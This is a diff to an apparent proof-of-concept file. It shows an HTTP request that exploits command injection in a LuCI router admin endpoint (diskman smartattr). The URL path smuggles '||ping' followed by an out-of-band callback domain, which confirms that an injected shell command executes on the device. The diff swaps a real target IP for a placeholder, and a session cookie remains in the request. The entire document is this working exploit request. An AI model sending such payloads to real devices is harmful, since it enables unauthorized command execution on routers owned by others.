@@ -1,7 +1,7 @@
 ## poc
 ```C
 GET /cgi-bin/luci/admin/system/diskman/smartattr/{{urlescape(||ping 71oi4kwf.eyes.sh)}} HTTP/1.1
-Host: 114.132.79.71:7889
+Host: IP:PORT
 Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7,en-GB;q=0.6,en-US;q=0.5
 Cookie: sysauth_http=4b524da6571cdd27dac062efd9c8be9d
 Cache-Control: max-age=0
